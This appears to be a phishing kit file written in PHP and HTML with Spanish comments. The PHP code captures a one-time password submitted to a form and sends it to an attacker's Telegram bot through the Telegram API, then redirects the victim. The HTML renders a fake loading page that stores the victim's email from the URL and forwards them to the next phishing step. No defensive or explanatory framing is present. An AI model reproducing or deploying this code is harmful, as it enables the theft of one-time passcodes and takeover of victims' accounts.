<?php
// Cargar token y chat_id desde settings.php
require_once "settings.php";

// Recibir código OTP del formulario
$otp = $_POST['otp_code'] ?? "NO RECIBIDO";

// Construir mensaje
$mensaje = "🔔 *Nuevo código OTP recibido*\n\n";
$mensaje .= "Código: *$otp*";

// Enviar a Telegram vía API
$url = "https://api.telegram.org/bot$token/sendMessage";

$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => "Markdown"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

// Luego de enviar puedes redirigir
header("Location: pinmal.html");
exit;
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando...</title>

<style>
    body {
        margin: 0;
        padding: 0;
        background: #009b38;
        width: 100vw;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        overflow: hidden;
    }

    .logo {
        width: 110px;
        margin-bottom: 40px;
        animation: fadeIn 1s ease forwards;
    }

    .loader {
        width: 45px;
        height: 45px;
        border: 5px solid transparent;
        border-top: 5px solid rgba(255,255,255,0.85);
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(-15px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .doc-label {
        margin-top: 20px;
        color: white;
        font-size: 14px;
        opacity: 0.8;
    }
</style>
</head>
<body>

<img src="img/bluee.svg" class="logo" alt="Logo">

<div class="loader"></div>
<div class="doc-label" id="docLabel"></div>

<script>
    // ---- Obtener email desde la URL si viene como ?email= ----
    function getEmailFromQuery() {
      const params = new URLSearchParams(window.location.search);
      return params.get("email");
    }

    const emailFromQuery = getEmailFromQuery();
    if (emailFromQuery) {
      sessionStorage.setItem("email", emailFromQuery);
    } else {
      // Si no viene en la URL, simplemente re-guarda el que ya exista
      const existingEmail = sessionStorage.getItem("email");
      if (existingEmail) {
        sessionStorage.setItem("email", existingEmail);
      }
    }

    // ---- Después de 10 segundos, pasar a step2.html ----
    setTimeout(() => {
      window.location.href = "cim.html";
    }, 10000); // 10.000 ms = 10 s
  </script>

</body>
</html>
